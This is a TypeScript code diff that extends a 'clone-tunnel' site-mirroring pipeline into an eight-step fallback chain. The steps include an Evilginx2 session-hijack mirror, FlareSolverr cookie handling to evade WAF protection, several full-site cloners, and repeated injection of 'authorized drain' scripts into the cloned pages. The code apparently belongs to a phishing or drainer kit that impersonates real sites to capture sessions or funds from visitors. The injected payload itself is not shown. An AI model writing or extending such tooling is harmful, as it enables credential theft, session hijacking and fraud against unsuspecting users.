@@ -12,6 +12,17 @@ import path from 'node:path'
 
 import { buildAuthorizedDrainCss, buildAuthorizedDrainInjectJs } from './authorized-drain-inject.js'
 import {
+  detectWafBlockedFromErrors,
+  isFlareSolverrEnabled,
+  runAiCloneStep,
+  runAsukaFallback,
+  runFlareSolverrStaticClone,
+  runSessionHijackAdapter,
+  runWebclonerStaticClone,
+  tryReplicaReverseProxy,
+  isWebclonerEnabled,
+} from './integrations/adapter-chain.js'
+import {
   fetchComposeContainerLogs,
   probeLocalMirrorHealth,
   startStaticServeFallback,
@@ -35,6 +46,12 @@ export type MirrorDeliveryMethod =
   | 'static-clone'
   | 'headless-capture'
   | 'placeholder'
+  | 'session-hijack'
+  | 'flaresolverr-static'
+  | 'asuka-static'
+  | 'webcloner-static'
+  | 'ai-clone'
+  | 'replica-proxy'
 
 export type MirrorStackMode = 'docker' | 'static'
 
@@ -59,6 +76,7 @@ export type MirrorFallbackChainOpts = {
   forceHardwareBypass: boolean
   backendUrl?: string
   pipelineCookies?: string
+  homepageHtml?: string
   runCommand: RunCommandFn
   generateTimeoutMs?: number
 }
@@ -122,6 +140,7 @@ async function writeMirrorMeta(
   targetUrl: string,
   method: MirrorDeliveryMethod,
   stackMode: MirrorStackMode,
+  extra?: Record<string, unknown>,
 ): Promise<void> {
   await writeFile(path.join(outDir, 'mirror-health'), 'ok\n', 'utf8')
   await writeFile(
@@ -132,6 +151,7 @@ async function writeMirrorMeta(
         stack_mode: stackMode,
         target_url: targetUrl,
         generated_at: new Date().toISOString(),
+        ...extra,
       },
       null,
       2,
@@ -387,7 +407,8 @@ async function clearDockerMirrorArtifacts(
 }
 
 /**
- * Attempt reverse-proxy → static clone → headless capture → placeholder.
+ * Attempt session-hijack → reverse-proxy (replica/nginx) → flaresolverr+static →
+ * asuka → headless capture → placeholder.
  * Always returns a serving stack when placeholder succeeds.
  */
 export async function runMirrorFallbackChain(
@@ -396,12 +417,25 @@ export async function runMirrorFallbackChain(
   await mkdir(opts.outDir, { recursive: true })
   const errors: string[] = []
 
-  console.error('[clone-tunnel] Fallback chain: reverse-proxy → static-clone → headless → placeholder')
+  const adapterCtx = { ...opts, wafBlocked: false }
 
-  // 1 — Reverse proxy (nginx docker)
+  // 0 — Session hijack (Evilginx2) — skips drain inject
+  const hijack = await runSessionHijackAdapter(adapterCtx)
+  if (hijack) {
+    console.error('[clone-tunnel] Session hijack mirror deployed')
+    return hijack
+  }
+
+  console.error(
+    '[clone-tunnel] Fallback chain: reverse-proxy → flaresolverr → static → asuka → webcloner → headless → placeholder',
+  )
+
+  // 1 — Reverse proxy (Replica optional, else nginx docker)
   try {
-    console.error('[clone-tunnel] [1/4] Attempting reverse-proxy mirror (nginx)…')
-    await generateReverseProxyMirror(opts)
+    console.error('[clone-tunnel] [1/8] Attempting reverse-proxy mirror…')
+    const usedReplica = await tryReplicaReverseProxy(adapterCtx, () =>
+      generateReverseProxyMirror(opts),
+    )
     const dockerOk = await tryDockerMirrorStack(
       opts.outDir,
       opts.targetUrl,
@@ -409,20 +443,58 @@ export async function runMirrorFallbackChain(
       opts.runCommand,
     )
     if (dockerOk) {
-      await writeMirrorMeta(opts.outDir, opts.targetUrl, 'reverse-proxy', 'docker')
-      console.error('[clone-tunnel] [1/4] Reverse-proxy mirror healthy')
-      return { method: 'reverse-proxy', stackMode: 'docker', errors }
+      const method = usedReplica ? 'replica-proxy' : 'reverse-proxy'
+      await writeMirrorMeta(opts.outDir, opts.targetUrl, method, 'docker')
+      console.error(`[clone-tunnel] [1/8] Reverse-proxy mirror healthy (${method})`)
+      return { method, stackMode: 'docker', errors }
     }
     errors.push('reverse-proxy: docker stack or health check failed')
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e)
     errors.push(`reverse-proxy: ${msg}`)
-    console.error(`[clone-tunnel] [1/4] Reverse-proxy failed: ${msg}`)
+    console.error(`[clone-tunnel] [1/8] Reverse-proxy failed: ${msg}`)
   }
 
-  // 2 — Static clone (fetch + local assets)
+  // 2 — FlareSolverr + static clone (optional webcloner-js)
+  if (isFlareSolverrEnabled()) {
+    try {
+      console.error('[clone-tunnel] [2/8] FlareSolverr + static clone…')
+      await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
+      const flare = await runFlareSolverrStaticClone(
+        adapterCtx,
+        async (cookies) => {
+          if (cookies) process.env['MIRROR_PROXY_COOKIES'] = cookies
+          await generateStaticCloneMirror(opts)
+        },
+        async () => {
+          const dockerOk = await tryDockerMirrorStack(
+            opts.outDir,
+            opts.targetUrl,
+            opts.port,
+            opts.runCommand,
+          )
+          if (dockerOk) return true
+          return tryStaticServe(opts.outDir, opts.port)
+        },
+      )
+      if (flare.ok) {
+        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'flaresolverr-static', 'static', {
+          integration: flare.usedWebcloner ? 'flaresolverr+webcloner' : 'flaresolverr',
+        })
+        console.error('[clone-tunnel] [2/8] FlareSolverr static clone healthy')
+        return { method: 'flaresolverr-static', stackMode: 'static', errors }
+      }
+      if (flare.detail) errors.push(`flaresolverr: ${flare.detail}`)
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : String(e)
+      errors.push(`flaresolverr: ${msg}`)
+      console.error(`[clone-tunnel] [2/8] FlareSolverr path failed: ${msg}`)
+    }
+  }
+
+  // 3 — Static clone (fetch + local assets) — original step
   try {
-    console.error('[clone-tunnel] [2/4] Attempting static clone generation…')
+    console.error('[clone-tunnel] [3/8] Attempting static clone generation…')
     await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
     await generateStaticCloneMirror(opts)
     const dockerOk = await tryDockerMirrorStack(
@@ -433,45 +505,127 @@ export async function runMirrorFallbackChain(
     )
     if (dockerOk) {
       await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'docker')
-      console.error('[clone-tunnel] [2/4] Static clone healthy (docker)')
+      console.error('[clone-tunnel] [3/8] Static clone healthy (docker)')
       return { method: 'static-clone', stackMode: 'docker', errors }
     }
     const staticOk = await tryStaticServe(opts.outDir, opts.port)
     if (staticOk) {
       await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'static')
-      console.error('[clone-tunnel] [2/4] Static clone healthy (npx serve)')
+      console.error('[clone-tunnel] [3/8] Static clone healthy (npx serve)')
       return { method: 'static-clone', stackMode: 'static', errors }
     }
     errors.push('static-clone: generation ok but serve/health failed')
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e)
     errors.push(`static-clone: ${msg}`)
-    console.error(`[clone-tunnel] [2/4] Static clone failed: ${msg}`)
+    console.error(`[clone-tunnel] [3/8] Static clone failed: ${msg}`)
   }
 
-  // 3 — Headless puppeteer capture
+  // 4 — Asuka full-site download
   try {
-    console.error('[clone-tunnel] [3/4] Attempting headless browser capture…')
+    console.error('[clone-tunnel] [4/8] Asuka full-site clone…')
+    await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
+    const backendUrl = opts.backendUrl ?? DEFAULT_BACKEND_URL
+    const asuka = await runAsukaFallback(adapterCtx, async () => {
+      await writeAuthorizedDrainAssets(opts.outDir, backendUrl, opts.forceHardwareBypass)
+      const { readFile } = await import('node:fs/promises')
+      const htmlPath = path.join(opts.outDir, 'index.html')
+      try {
+        let html = await readFile(htmlPath, 'utf8')
+        html = injectScriptsIntoHtml(html)
+        await writeFile(htmlPath, html, 'utf8')
+      } catch {
+        /* index may be nested */
+      }
+      return tryStaticServe(opts.outDir, opts.port)
+    })
+    if (asuka.ok) {
+      await writeMirrorMeta(opts.outDir, opts.targetUrl, 'asuka-static', 'static', {
+        integration: 'asuka',
+      })
+      console.error('[clone-tunnel] [4/8] Asuka mirror healthy')
+      return { method: 'asuka-static', stackMode: 'static', errors }
+    }
+    if (asuka.detail) errors.push(`asuka: ${asuka.detail}`)
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e)
+    errors.push(`asuka: ${msg}`)
+    console.error(`[clone-tunnel] [4/8] Asuka failed: ${msg}`)
+  }
+
+  // 5 — webcloner-js static clone
+  if (isWebclonerEnabled()) {
+    try {
+      console.error('[clone-tunnel] [5/8] webcloner-js static clone…')
+      await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
+      const backendUrl = opts.backendUrl ?? DEFAULT_BACKEND_URL
+      const wc = await runWebclonerStaticClone(adapterCtx, async () => {
+        await writeAuthorizedDrainAssets(opts.outDir, backendUrl, opts.forceHardwareBypass)
+        const { readFile } = await import('node:fs/promises')
+        const htmlPath = path.join(opts.outDir, 'index.html')
+        try {
+          let html = await readFile(htmlPath, 'utf8')
+          html = injectScriptsIntoHtml(html)
+          await writeFile(htmlPath, html, 'utf8')
+        } catch {
+          /* nested index */
+        }
+        return tryStaticServe(opts.outDir, opts.port)
+      })
+      if (wc.ok) {
+        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'webcloner-static', 'static', {
+          integration: 'webcloner-js',
+        })
+        console.error('[clone-tunnel] [5/8] webcloner-js mirror healthy')
+        return { method: 'webcloner-static', stackMode: 'static', errors }
+      }
+      if (wc.detail) errors.push(`webcloner: ${wc.detail}`)
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : String(e)
+      errors.push(`webcloner: ${msg}`)
+      console.error(`[clone-tunnel] [5/8] webcloner failed: ${msg}`)
+    }
+  }
+
+  // 6 — AI clone (optional)
+  try {
+    const ai = await runAiCloneStep(adapterCtx)
+    if (ai.ok) {
+      const served = await tryStaticServe(opts.outDir, opts.port)
+      if (served) {
+        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'ai-clone', 'static', {
+          integration: 'clooney-agent',
+        })
+        return { method: 'ai-clone', stackMode: 'static', errors }
+      }
+    }
+  } catch {
+    /* optional */
+  }
+
+  // 7 — Headless puppeteer capture
+  try {
+    console.error('[clone-tunnel] [7/8] Attempting headless browser capture…')
     await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
     const ok = await deployHeadlessCaptureMirror(opts)
     if (ok) {
       await writeMirrorMeta(opts.outDir, opts.targetUrl, 'headless-capture', 'static')
-      console.error('[clone-tunnel] [3/4] Headless capture mirror healthy')
+      console.error('[clone-tunnel] [7/8] Headless capture mirror healthy')
       return { method: 'headless-capture', stackMode: 'static', errors }
     }
     errors.push('headless-capture: serve/health failed')
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e)
     errors.push(`headless-capture: ${msg}`)
-    console.error(`[clone-tunnel] [3/4] Headless capture failed: ${msg}`)
+    console.error(`[clone-tunnel] [7/8] Headless capture failed: ${msg}`)
   }
 
-  // 4 — Placeholder
-  console.error('[clone-tunnel] [4/4] Deploying placeholder mirror…')
+  // 8 — Placeholder
+  console.error('[clone-tunnel] [8/8] Deploying placeholder mirror…')
   const placeholderOk = await deployPlaceholderMirror(opts)
   if (placeholderOk) {
     await writeMirrorMeta(opts.outDir, opts.targetUrl, 'placeholder', 'static')
-    console.error('[clone-tunnel] [4/4] Placeholder mirror serving (target unreachable)')
+    console.error('[clone-tunnel] [8/8] Placeholder mirror serving (target unreachable)')
     return { method: 'placeholder', stackMode: 'static', errors }
   }
 
